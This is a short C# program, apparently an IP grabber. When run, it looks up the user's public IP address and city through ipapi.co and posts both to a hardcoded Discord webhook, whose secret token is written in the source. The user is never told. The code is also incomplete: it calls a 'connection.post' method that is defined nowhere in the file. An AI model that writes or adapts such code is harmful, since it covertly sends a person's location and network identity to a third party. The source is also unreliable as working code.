using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace SEND_USER_IP
{
    internal class Program
    {
        private static void send(string url, string message, string botname)
        {
            connection.post(url, new System.Collections.Specialized.NameValueCollection()
            {
                {
                    "username",
                    botname
                },
                {
                    "content",
                    message
                }
            });
        }

        static void Main(string[] args)
        {
            WebClient wc = new WebClient();
            var use_ip = wc.DownloadString("https://ipapi.co/ip");
            var use_city = wc.DownloadString("https://ipapi.co/city");

            send("https://discord.com/api/webhooks/1038115916438839377/8uJWkCjh8KTBx5fM19ahovpZJXO0u5SDtdcncWeyfgfu3xBmtE8pxGV5_MvgVHoygeYh", "User Ip : " + use_ip, "User Ip Bot");
            send("https://discord.com/api/webhooks/1038115916438839377/8uJWkCjh8KTBx5fM19ahovpZJXO0u5SDtdcncWeyfgfu3xBmtE8pxGV5_MvgVHoygeYh", "User City : " + use_city, "User City Bot");
        }
    }
}
